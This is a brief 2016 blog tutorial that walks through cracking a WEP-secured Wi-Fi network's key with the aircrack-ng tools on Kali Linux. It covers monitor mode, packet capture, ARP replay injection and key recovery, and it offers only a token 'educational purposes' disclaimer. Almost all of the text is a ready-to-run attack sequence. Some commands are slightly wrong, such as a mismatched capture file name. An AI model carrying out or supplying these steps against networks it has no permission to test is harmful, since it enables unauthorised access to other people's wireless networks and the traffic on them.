How to hack wifi with WEP security

16 April 2016 on #Hacking, #Tutorial

This is a tutorial for hacking a Wifi with WEP security.

Note: This tutorial is for educational purposes, I'm not responsible for any misuse of it.


Requirements:

  • Kali Linux

    • Wifi card plugged in

Procedure:

  • List all the interfaces
$ airmon-ng
  • Activate the interface

$ airmon-ng start wlan0

  • Start monitormode to scan
$ airodump-ng start wlan0mon

  • Note down the ESSID, BSSID, CHANNEL of the network.

  • Start collecting packets

$ airodump-ng -w ESSID -c CHANNEL --bssid BSSID wlan0mon
  • Send ARP request. Open other terminal
$ aireplay-ng 1 0 -a BSSID wlan0mon
$ aireplay-ng 3 -b BSSID wlan0mon
Note: Wait till the data reaches 100,000.

  • Stop both the processes.

  • List the files in Home Directory

$ cd
$ ls

  • Look for a file named like ESSID-01.cap

  • Crack the password

$ aircrack-ng <BSSID>-01.cap

  • Key will appear after a few seconds.

  • Done!
